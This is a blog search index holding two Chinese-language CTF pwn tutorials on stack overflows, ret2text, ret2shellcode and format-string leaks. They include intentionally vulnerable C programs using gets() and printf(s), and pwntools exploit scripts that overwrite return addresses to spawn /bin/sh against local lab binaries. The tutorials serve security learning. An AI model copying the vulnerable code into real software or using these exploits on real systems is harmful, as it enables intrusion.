<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwn学习路线</title>
    <url>/2022/06/01/pwn%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
    <content><![CDATA[<p>CTFwiki：<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">https://ctf-wiki.org/pwn/linux/user-mode/environment/</a></p>
<h1 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h1><h2 id="学习pwn需要的环境和工具"><a href="#学习pwn需要的环境和工具" class="headerlink" title="学习pwn需要的环境和工具"></a>学习pwn需要的环境和工具</h2><p>需要安装python的第三方库pwntools、gdb的增强版pwndbg、ruby语言里的Onegadget，其他的工具任意，具体安装步骤在B站的星盟pwn讲学的第一章(pwn环境的搭建)。</p>
<p>ida可以到爱盘(吾爱破解)里面找到</p>
<p>Ubuntu我装的是20</p>
<span id="more"></span>

<p><strong>注意：</strong></p>
<p>在自己编译程序的时候，想要关闭一些保护，方法如下：</p>
<p><strong>NX</strong>	<code>-z execstack</code> &#x2F; <code>-z noexecstack</code> (关闭 &#x2F; 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</p>
<p><strong>Canary</strong>	<code>-fno-stack-protector</code> &#x2F;<code>-fstack-protector</code> &#x2F; <code>-fstack-protector-all</code> (关闭 &#x2F; 开启 &#x2F; 全开启) 栈里插入cookie信息</p>
<p><strong>PIE</strong>	<code>-no-pie</code> &#x2F; <code>-pie</code> (关闭 &#x2F; 开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></p>
<p><strong>RELRO</strong>	<code>-z norelro</code> &#x2F; <code>-z lazy</code> &#x2F; <code>-z now</code> (关闭 &#x2F; 部分开启 &#x2F; 完全开启) 对GOT表具有写权限</p>
<p>如果不想把一些危险的函数进行优化，可以使用 <code>-fno-builtin</code></p>
<p>如果想编译出来的程序是32位的，可以使用 <code>-m32</code></p>
<p>附：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//编译32位出错的话，可以在终端执行如下指令后再进行编译</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get purge libc6-dev</span><br><span class="line"></span><br><span class="line">sudo apt-get install libc6-dev</span><br><span class="line"></span><br><span class="line">sudo apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure>

<p>编写源码的初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> &#123; </span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h2><h3 id="栈利用"><a href="#栈利用" class="headerlink" title="栈利用"></a>栈利用</h3><h4 id="栈介绍以及栈溢出原理"><a href="#栈介绍以及栈溢出原理" class="headerlink" title="栈介绍以及栈溢出原理"></a>栈介绍以及栈溢出原理</h4><p>在数据结构里面第一次接触到栈，栈和队列不一样，栈的数据结构是先进后出(FILO)，c++的STL库里也为我们提供了stack这种数据容器，栈的操作主要是入栈(压栈)和出栈。</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202203290800134.png" alt="栈的结构" style="zoom:67%;" />

<p>在汇编语言(可以看看B站里小甲鱼讲的)里面有一个专门定义栈的段(栈段)，可以看到，程序中栈的地址空间是从高地址向低地址增长(预设好栈的空间)。</p>
<p>注意：x86(32)和x64(64)程序的区别</p>
<p><strong>x86</strong></p>
<p>函数参数在函数返回地址的上方</p>
<p><strong>x64</strong></p>
<p>1、前6个整数或指针参数依次保存在<strong>rdi、rsi、rdx、rcx、r8、r9</strong>寄存器中，再多的话放到栈上</p>
<p>2、内存地址不能大于<strong>0x00007FFFFFFFFFFF</strong>，<strong>6个字节长度</strong>，否则抛出异常</p>
<p><strong>栈是如何通过溢出造成漏洞？</strong></p>
<p>向栈中某个变量写入的字节长度&gt;变量申请的字节长度，进而导致改变与其相邻的栈中的变量的值。</p>
<p>想要造成栈溢出，至少需要满足：1、必须向栈上写入数据	2、允许写入的数据大于变量申请的空间</p>
<p><strong>使用一个例子(ret2xxx)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -no-pie stack.c -o stack </span></span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204032358943.png" alt="image-20220403235858877" style="zoom:80%;" />

<p>看到<strong>gets</strong>和<strong>puts</strong>函数，简直是标配的ret2xxx，32位的传参顺序如上，直接用脚本了(需要安装第三方库pwntools)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span>		<span class="comment">#也可以直接使用pwntools中的函数自动查询，success_addr=elf.sym[&#x27;success&#x27;]</span></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>栈溢出的总结</strong></p>
<p>利用一些危险的函数，确定程序是否有溢出及其位置，一些常见的危险函数如下：</p>
<p><strong>input：</strong>gets(直接读取一行，忽略’\x00’)、scanf、vscanf</p>
<p><strong>output：</strong>sprintf</p>
<p><strong>string：</strong>strcpy、strcat、bcopy</p>
<p><strong>对于填充的长度</strong></p>
<p>ida一打开对于字符串数组变量的长度，一般看ebp就知道了，还有一些变量是直接地址索引的，相当于直接给出地址</p>
<h4 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h4><p><strong>ROP 是啥呢</strong></p>
<p>ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
<p>这类题目一般开启NX保护</p>
<p>ROP攻击一般需要满足一些条件：</p>
<p>1、程序存在溢出，并且考研控制返回地址</p>
<p>2、可以找到满足条件的gadgets以及相应gadgets地址</p>
<h5 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h5><p>ret2text即控制程序本身已经有的代码 (.text)。</p>
<p>示例源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//name:stack01.c</span></span><br><span class="line"><span class="comment">//gcc -m32 -no-pie -z noexecstack -fno-stack-protector -z lazy stack01.c -o stack01</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Congratulations,you find it!&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line"> 	gets(s);</span><br><span class="line">  	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Hello,ctfer!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Can you find backdoor?&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s sign in!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Give me your choice:&quot;</span>);</span><br><span class="line">	vulnerable();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到满足栈溢出的条件(有gets函数)，同时，在代码段里面，看到了调用了system(“&#x2F;bin&#x2F;sh”)</p>
<p>检查保护</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041004930.png" alt="image-20220404100423876" style="zoom:80%;" />

<p>看看ida里面反汇编</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041007160.png" alt="image-20220404100757120" style="zoom:80%;" />

<p>gets函数明显存在栈溢出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">填充的长度:junk=b&#x27;a&#x27;*(0x14+4)		#如果是64位就加8</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041009646.png" alt="image-20220404100938611" style="zoom:80%;" />

<p>哦吼，直接让gets函数的返回地址改为backdoor不就好了</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>		<span class="comment">#设置运行的py等级为调试</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=remote(,)					#这里没有放到服务器上，打本地就行了</span></span><br><span class="line">io=process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">4</span>)</span><br><span class="line">backdoor=elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]	<span class="comment">#利用pwntools自带的函数查询backdoor地址</span></span><br><span class="line"></span><br><span class="line">payload=junk+p32(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/202204041014085.png" alt="image-20220404101444024" style="zoom:80%;" />

<h5 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h5><p>原理：控制程序执行shellcode</p>
<p><strong>什么是shellcode?</strong>	答：用于完成某个功能的汇编代码。</p>
<p>对于做题而言，一般我们需要填充一些可执行的代码。这类题目一般需要两个前提，即存在栈溢出，且填充的shellcode所在的区域有可执行的<strong>权限</strong>。</p>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><h4 id="定义-wiki"><a href="#定义-wiki" class="headerlink" title="定义(wiki)"></a>定义(wiki)</h4><p>格式化字符串（英语：format string）是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的函数(学过c语言容易理解)。通俗的说，就是把计算机存储的相关数据变成人们可以看懂的字符串形式。</p>
<p>举个例子</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430190154204.png" alt="image-20220430190154204" style="zoom:80%;" />

<p>格式化占位符的语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>

<p>其中，parameter可以忽略或者是<code>n$</code></p>
<blockquote>
<p>n是用这个格式说明符（specier）显示第几个参数；这使得参数可以输出多次，使<br>用多个格式说明符，以不同的顺序输出。</p>
</blockquote>
<p>flags可为0或者多个</p>
<blockquote>
<p>重点关注字符’#’</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>意思</th>
</tr>
</thead>
<tbody><tr>
<td>#</td>
<td>对于’ g ‘与’ G ‘，不删除尾部0以表示精度。对于’ f ‘, ‘ F ‘, ‘ e ‘, ‘ E ‘, ‘ g ‘, ‘ G ‘,总是输出小数点。对于’ o ‘, ‘ x ‘, ‘ X ‘, 在非0数值前分别输出前缀0 , 0x , 0X 表示数制。</td>
</tr>
</tbody></table>
</blockquote>
<p>field width表示数值的最小宽度，典型用于制表输出时填充固定宽度的表目</p>
<p>Precision通常指明输出的最大长度，依赖于特定的格式化类型</p>
<p>length指出浮点型参数或整型参数的长度</p>
<p><strong>Type</strong>，也称转换说明，常见的</p>
<blockquote>
<p>%d - 十进制 - 输出十进制整数</p>
<p>%s - 字符串 - 从内存中读取字符串(string)</p>
<p>%x - 十六进制 - 输出十六进制数</p>
<p>%c - 字符 - 输出字符(char)</p>
<p>%p - 指针 - 指针地址(这个经常用)</p>
</blockquote>
<p>在c的代码中，常见的格式化字符串函数有：</p>
<p>输入：scanf</p>
<p>输出：printf、fprintf(目前做的题目碰到printf比较多)</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>攻击的方式很简单，因为printf函数中的相关参数都会从栈上去一个数值视作地址然后去访问，地址可能是不存在或者禁止访问，最后使得程序崩溃掉</p>
<p><strong>举个例子</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//name:  pwn.c</span></span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -no-pie -o pwn pwn.c</span></span><br></pre></td></tr></table></figure>

<p>编译后检查一下保护(编译时候报警告不需要管，就是要对这个危险的函数进行leak的嘛)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/vi0let/文档/pwn/笔记/study/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>跑一下看看(可以使用，-分隔但是不能使用空格会被截断的)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  study ./pwn</span><br><span class="line">%08x,%08x,%08x</span><br><span class="line">00000001.22222222.ffffffff.%08x,%08x,%08x</span><br><span class="line">ffbc1780,f7f03990,080491d1</span><br></pre></td></tr></table></figure>

<p>再使用gdb调试一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  study gdb pwn</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x8049070</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/vi0let/文档/pwn/笔记/study/pwn </span><br><span class="line">%08x,%08x,%08x</span><br></pre></td></tr></table></figure>

<p>可以看到</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430212855488.png" alt="image-20220430212855488" style="zoom:80%;" />

<p>因为之前已经在程序中对调用printf函数下了断点，所以执行的时候自然就停了下来</p>
<p>明显看到栈上的分布，第一个变量是<strong>返回地址</strong>，第二个变量是<strong>格式化字符串</strong>地址，第三个变量是<strong>a的值</strong>，第四个变量是<strong>b的值</strong>，第五个变量是<strong>c的值</strong>，第六个变量为<strong>我们输入的格式化字符串对应的地址</strong>。</p>
<p>继续调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.22222222.ffffffff.%08x,%08x,%08x</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ffffcfd0,f7ffd990,080491d1[Inferior 1 (process 8801) exited normally]</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220430214716359.png" alt="image-20220430214716359" style="zoom:80%;" />

<p>和上面第一次调用printf类似</p>
<p>同样可以使用**%p,%p,%p**(建议以后使用%p 因为不用考虑位数的问题)，或者**%3$p**在第二次打印的时候打印出第三个参数的地址。</p>
<p>如果参数之间用空格分隔的话(%p %p %p)，会出现这样的情况</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502192058542.png" alt="image-20220502192058542" style="zoom:80%;" />

<p>这是因为%s格式化字符串会到空格这里截断。</p>
<p>上面的一个例子可以发现</p>
<ul>
<li>%p可以获取对应栈的内存地址</li>
<li>%s可以显示出变量对应的地址的<strong>内容</strong>，但是会有零截断</li>
<li>%n$p获取指定参数的值</li>
</ul>
<p>很显然，%s打印变量内容，而%p表示内存地址，那么就会有一个想法，变量为%p，就会打印出栈上参数对应的地址咯(在上一题的实验也可以看到)</p>
<p>所以可以使用<code>[tag]%p%p%p%p%p%p%p%p%p </code>来打印出其格式化字符串的地址。拿刚才的例子试一下</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193248109.png" alt="image-20220502193248109" style="zoom:80%;" />

<p>用aaaa%4$p打印看看(a的ASCII值是0x61)</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220502193443643.png" alt="image-20220502193443643" style="zoom:80%;" />
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF Wiki之栈溢出</title>
    <url>/2022/06/15/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>网站：<a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>
<p>附言：所有的学习均在本地测试，远程可以使用socat或者docker部署</p>
<span id="more"></span>

<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p><strong>保护检查</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191107953.png" alt="image-20220615191107953"></p>
<p>32位，开启NX保护。</p>
<p>查看调用的函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191201980.png" alt="image-20220615191201980"></p>
<p>发现sysytem、printf、gets、puts等。</p>
<p>ida打开看看(F5反汇编)</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193317042.png" alt="image-20220615193317042"></p>
<p>shift+f12查看字符串</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193542927.png" alt="image-20220615193542927"></p>
<p>很明显，在主函数中，gets函数存在栈溢出，并且字符串中调用了&#x2F;bin&#x2F;sh，追踪发现secure调用了system(“&#x2F;bin&#x2F;sh”)，记录一下地址。</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615194305769.png" alt="image-20220615194305769" style="zoom:80%;" />

<p>可以造成溢出的gets函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615200638390.png" alt="image-20220615200638390"></p>
<p>需要计算s相对于返回地址的偏移，可以使用gdb动态调试得到，也可以直接利用ida给出的偏移值计算(这个方法在主函数使用时候经常是给出的偏移是错误的)</p>
<p><strong>调试</strong></p>
<p><strong>使用gdb动态调试：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2text			<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x080486AE	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行截图如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202027514.png" alt="image-20220615202027514"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202045907.png" alt="image-20220615202045907"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb动态调试计算偏移</span><br><span class="line">由图可知</span><br><span class="line">esp            0xffffcf20</span><br><span class="line">ebp            0xffffcfa8</span><br><span class="line">s=esp+1ch=ffffcf3c</span><br><span class="line">s相对于ebp偏移：offset=ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移(因为是32位，所以直接+4)：0x6c+4</span><br></pre></td></tr></table></figure>



<p><strong>攻击思路</strong></p>
<p>利用gets函数进行栈溢出，并且修改返回的地址</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试相关信息</span></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)										#远程访问，需要自己挂上去</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2text&#x27;</span>)							<span class="comment">#本地访问</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2text&#x27;)								#导入本地文件</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#计算的偏移，需要填充垃圾数据</span></span><br><span class="line">shellc=<span class="number">0x0804863A</span>									<span class="comment">#记录在ida找到的system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload=junk+p32(shellc)							<span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送构造好的payload</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程进行交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿到shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615204942903.png" alt="image-20220615204942903"></p>
<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p><strong>保护检查</strong></p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163235776.png" alt="image-20220616163235776" style="zoom:80%;" />

<p>32位，没有开启保护，说明栈上可执行</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163318074.png" alt="image-20220616163318074" style="zoom:80%;" />

<p>可以看到一些经常利用的函数，如gets…</p>
<p>ida打开看看</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164235497.png" alt="image-20220616164235497" style="zoom:80%;" />

<p>可以造成溢出的gets函数(因为gets没有设置字符串长度)</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164317442.png" alt="image-20220616164317442" style="zoom:80%;" />

<p>看主函数，可以知道当输入完s(长度为100)后，使用strncpy把s的数据复制到buf2，因为buf2没有在主函数中设出来，所以应该是一个全局变量，未初始化的全局变量一般保存在bss段中，双击buf2变量，看一下</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164947894.png" alt="image-20220616164947894" style="zoom:80%;" />



<p><strong>使用gdb调试看看</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode 		<span class="comment">#启动gdb</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b main			<span class="comment">#在主函数处下断点</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap			<span class="comment">#查看当前程序的系统调用库</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616165950043.png" alt="image-20220616165950043" style="zoom:80%;" />

<p>由ida中的bss地址看到所属的区域(在第一行里)是具有可执行的权限的。</p>
<p>通过主函数可以知道把s的数据复制到buf2这个可以执行的bss段上，复制的大小是0x64，0x64-0x1C&#x3D;0x48&#x3D;72，大小足够了，直接使用pwntools提供的函数即可，可以看一下pwntools中构造 shellcode的字符串长度</p>
<p>这个是32位的shellc</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171527851.png" alt="image-20220616171527851" style="zoom:80%;" />

<p>这个是64位的shellc</p>
<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171732498.png" alt="image-20220616171732498" style="zoom:80%;" />

<p>对于偏移的计算，跟上面的ret2text原理一样</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode		<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x08048593	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616190029416.png" alt="image-20220616190029416" style="zoom:80%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp            0xffffcef0          </span><br><span class="line">ebp            0xffffcf78   </span><br><span class="line">s=esp+0x1c=ffffcf0c</span><br><span class="line">s相对于esp的偏移：ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>



<p><strong>攻击思路</strong></p>
<p>利用gets函数造成栈溢出修改返回地址为buf2的地址，在s中填充shellcode(需要填满，空余的用其他垃圾数据填充)</p>
<p><strong>exp</strong></p>
